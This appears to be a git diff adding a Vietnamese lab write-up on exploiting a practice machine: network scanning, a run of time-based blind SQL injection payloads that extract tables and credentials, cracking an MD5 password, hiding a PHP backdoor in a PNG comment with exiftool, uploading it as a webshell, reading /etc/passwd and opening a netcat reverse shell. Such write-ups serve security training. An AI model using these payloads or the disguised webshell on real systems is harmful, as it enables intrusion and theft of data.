@@ -11,6 +11,98 @@
 ### Nội dung báo cáo 
 #### 1. Khai thác sqli level2 <a name="gioithieu"></a>
 <br> 1.1 Phương Pháp manual <a name="kni"></a></br>
+ - B1: Sử dụng `netdiscover` để quét Giao thức ARP và nhận các thiết bị trên Mạng LAN Chúng ta có thể thấy rằng IP thứ ba là IP mong muốn và IP thứ hai là IP Kali của chúng ta
+ 
+     ![image](https://user-images.githubusercontent.com/101852647/162161017-e3d3f2d7-7a10-4490-9348-e5ce7c6378fc.png)
+     
+     ![image](https://user-images.githubusercontent.com/101852647/162161080-8b39fe9c-6d5c-4f6e-b87b-e69c0636687f.png)
+ 
+ - B2:Bây giờ sử dụng nmap để tìm ra các cổng đang mở. Ta sẽ thấy cổng 80 đang mở.
+ 
+     ![image](https://user-images.githubusercontent.com/101852647/162161149-4caf7710-31c8-4c4c-a375-30e68bd76935.png)
+     
+ - B3: Mở trang web lên và nhấn vào test bây giờ chúng ta sẽ test thử xem nó có url có dễ bị chèn sqli hay không bằng cách thêm `?id=1'` thì thấy không có hiện tượng gì chứng tỏ trang web này không dễ bị chèn sqli. Vì vậy chúng ta sẽ khai thác sql mù dựa trên việc thực thi mã từ xa bằng cách sử dụng một webshell php.
+ 
+     ![image](https://user-images.githubusercontent.com/101852647/162015980-bdc27640-da14-4d99-876c-7507aa24229d.png)
+     
+ - B4: Chúng ta sẽ sử dụng file ` BlindSQLI.py` để tìm ra `user` và `password`. Trong đó sẽ có các câu lệnh truy xuất thông tin có trong database. Chúng ta sẽ chạy file và sử dụng câu lệnh `'''1' OR IF ((SELECT LENGTH(database()) FROM dual) = %s , sleep(1), 'a')-- -'''` để tìm ra được độ dài của database. Sử dụng câu lệnh `'''1' OR (select sleep(1) from dual where database() like '%s')-- -'''` để tìm được tên của database.
+ 
+     ![image](https://user-images.githubusercontent.com/101852647/162573244-0e8a78cb-31f1-4398-8a63-14f16efbd99f.png)
+
+ - B5: Tiếp theo chúng ta sử dụng câu lệnh `'''1' OR IF ((SELECT count(table_name) FROM information_schema.columns where table_schema=database()) = %s , sleep(1), 'a')-- -'''` để tìm ra và đếm được có bao nhiêu bảng trong database. Sử dụng câu lệnh ` '''1' OR IF ((SELECT COUNT(*) FROM information_schema.columns where table_name='{}') = %s , sleep(1), 'a')-- -'''` để tìm có bao nhiêu cột trong bảng đó và sử dụng câu lệnh `'''1' OR IF ((SELECT COUNT(*) FROM {}) = %s , sleep(1), 'a')-- -'''` để tìm ra có bao nhiêu hàng trong bảng đó.
+
+      ![image](https://user-images.githubusercontent.com/101852647/162573517-14877dcc-960f-4bec-b458-19129d767380.png)
+
+ - B6: Chúng ta sẽ sử dụng câu lệnh `'''1' OR IF ((SELECT LENGTH(table_name) FROM information_schema.columns where table_schema=database() limit 1 offset %s) = %s , sleep(1), 'a')-- -'''` và câu lệnh `'''1' OR IF ((SELECT SUBSTRING(table_name,%s,1) FROM information_schema.columns where table_schema=database() limit %s,1) = '%s' , sleep(1), 'a')-- -''` để in ra tên bảng và số cột, số hàng trong từng bảng.
+
+      ![image](https://user-images.githubusercontent.com/101852647/162573979-c52dd568-9f89-460f-bc61-7f45f038fe00.png)
+ 
+ - B7: Sử dụng câu lệnh `'''1' OR IF ((SELECT LENGTH(column_name) FROM information_schema.columns where table_name='{}' limit 1 offset %s) = %s , sleep(1), 'a')-- -'''` và `'''1' OR IF ((SELECT SUBSTRING(column_name,%s,1) FROM information_schema.columns where table_name='{}' limit %s,1) = '%s' , sleep(1), 'a')-- -'''` để tìm ra tên của các cột trong từng bảng.
+
+      ![image](https://user-images.githubusercontent.com/101852647/162574050-fa7482c6-79f3-47e8-9b4e-c08d9cdf228c.png)
+
+      ![image](https://user-images.githubusercontent.com/101852647/162574059-6ee20379-4595-4c47-a892-14501fa6174b.png)
+ - B8: Chúng ta sử dụng câu lệnh`'''1' OR IF ((SELECT LENGTH(CONCAT({})) FROM {} limit %s,1) = %s , sleep(1), 'a')-- -'''` và câu lệnh `'''1' OR IF ((SELECT SUBSTRING(CONCAT({}), %s, 1) FROM {} limit %s,1) = '%s' , sleep(1), 'a')-- -'''` để tìm ra tên hàng và các dữ liệu có trong từng bảng.
+
+      ![image](https://user-images.githubusercontent.com/101852647/162574238-16c9d729-6213-4948-9345-bd76d8818833.png)
+
+      ![image](https://user-images.githubusercontent.com/101852647/162574248-530ceb2e-9db2-4fcb-a30b-8d3b61c4c3ac.png)
+ - B9: Ở trên chúng ta đã khai thác được tên user và password nhưng vì password chúng ta đã được mã hóa ở dạng MD5 nên chúng ta sẽ giải mã nó ra. Sau khi giải mã chúng ta sẽ được password với tên là: `P4ssw0rd`.
+ - B10: Sau khi có được `username` và `password` thì chúng ta sẽ đăng nhập vào trang `admin` và nhiệm vụ chúng ta bây giờ là tải lên webshell php. 
+
+      ![image](https://user-images.githubusercontent.com/101852647/162019096-a6011726-c622-488a-9c9d-5e12a5b89db3.png)
+     
+      ![image](https://user-images.githubusercontent.com/101852647/162019124-3e624378-e516-4dfa-b015-1cdee9bd6861.png)  
+ - B11: Bây giờ chúng ta sẽ thử tải tệp có đuôi là `.php.jpg` nhưng không được.
+
+      ![image](https://user-images.githubusercontent.com/101852647/162019280-a8aba18e-0a05-44b1-877f-a8a6fe4ea755.png)
+     
+      ![image](https://user-images.githubusercontent.com/101852647/162019207-a55f96c2-8164-4143-8378-3fdde4bcaa8f.png)
+      
+ - B12: Sau đó, ta sử dụng `ExifTool` để liên kết một tệp php độc hại sẽ tạo ra lỗ hổng thực thi mã từ xa. Ta sẽ tải 1 file ảnh với tên là `img.png` và sao chép nó vào trong file `simple-backdoor.php` từ đường dẫn `/ usr / share / webshells / php `
+
+     ![image](https://user-images.githubusercontent.com/101852647/162161293-29f94981-c5c2-43b6-9f04-384356cc135d.png)
+     
+     ![image](https://user-images.githubusercontent.com/101852647/162161358-af71eeec-7e5d-4048-8206-f40ed66594fb.png)
+     
+     ![image](https://user-images.githubusercontent.com/101852647/162161484-afef8ec1-375d-4116-b6f6-6efd5f6dcf84.png)
+     
+     ![image](https://user-images.githubusercontent.com/101852647/162161553-9a4cfac0-94b9-4367-8ab7-7ffbdc586757.png)
+     
+ - B13: Bây giờ gõ lệnh cho `ExifTool` để ẩn mã độc của tệp php bên trong hình ảnh png bằng lệnh `exiftool "-comment <= simple-backdoor.php" img.png `
+
+    ![image](https://user-images.githubusercontent.com/101852647/162161620-1090e1d7-89e5-40f5-8597-f396f6cde245.png)
+    
+ - B14: Tiếp theo ta sẽ kiểm tra thông tin của hình ảnh bằng lệnh `exiftool img.png`. Như chúng ta có thể quan sát, mã độc được ẩn bên trong hình ảnh
+
+    ![image](https://user-images.githubusercontent.com/101852647/162161675-330d9dc4-1fd6-428b-873c-2f1409dee8dc.png)
+    
+ - B15:  Bây giờ chúng ta tải ảnh có ẩn mã đọc bên trong lên trang web cũng chính là cái webshell php của chúng ta
+
+    ![image](https://user-images.githubusercontent.com/101852647/162162220-e81d8a25-dc60-4c7e-a61b-3531b8646c3d.png)
+    
+ - B16: file ảnh đã tải thành công bây giờ chúng ta sẽ nhấn vào backdoor và bắt đầu thực thi nó
+
+    ![image](https://user-images.githubusercontent.com/101852647/162162284-0c35a439-429c-455a-b42e-9ac0b7cc5199.png)
+     
+    ![image](https://user-images.githubusercontent.com/101852647/162162352-6683c2db-9594-411b-ad73-676d94ac47e2.png)
+    
+ - B17: Bây giờ chúng ta mở mã nguồn nó lên và kiểm tra xem hình ảnh được tải lên liên kết chưa. Như chúng ta thấy thì chúng ta đã tìm thấy liên kết và mở nó lên.
+
+    ![image](https://user-images.githubusercontent.com/101852647/162162468-8f738285-9360-43f3-b226-4f493eabb764.png)
+    
+ - B18: Như chúng ta đã biết hình ảnh chứa một trình bao web sẽ cho phép thực thi mã từ xa. Do đó, sau khi khám phá đường dẫn được liệt kê ở trên, ta lấy tệp `/ etc / passwd`.
+
+    ![image](https://user-images.githubusercontent.com/101852647/162162559-36b513b5-d2bc-4eca-9028-282b525775c3.png)
+     
+    ![image](https://user-images.githubusercontent.com/101852647/162162584-c9718e4a-6dd5-4b9e-bf38-33fd4e529c22.png)
+     
+ - B19: Bây giờ, chạy trình lắng nghe netcat trong thiết bị đầu cuối và thực hiện kết nối ngược lại netcat để tạo web shell
+
+    ![image](https://user-images.githubusercontent.com/101852647/162162866-3a07624f-1f17-4f65-93a9-04e8cd54319a.png)
+     
+    ![image](https://user-images.githubusercontent.com/101852647/162162960-f6d9aed0-059a-48be-9893-4d170cb42459.png)
+
 
 <br> 1.2 Phương Pháp sử dụng công cụ sqlmap <a name="kni"></a></br>
  - B1: Sử dụng `netdiscover` để quét Giao thức ARP và nhận các thiết bị trên Mạng LAN Chúng ta có thể thấy rằng IP thứ ba là IP mong muốn và IP thứ hai là IP Kali của chúng ta
